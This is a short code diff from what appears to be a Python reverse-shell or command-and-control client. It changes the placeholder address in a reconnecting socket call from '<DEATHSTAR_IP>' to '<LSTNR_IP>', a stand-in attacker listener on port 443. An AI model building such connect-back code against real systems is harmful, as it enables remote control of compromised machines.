@@ -48,7 +48,7 @@ def connect_to_server():
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect(('<DEATHSTAR_IP>', 443))
+            sock.connect(('<LSTNR_IP>', 443))
             print("[+] Connected to server")
 
             # Send initial empty data
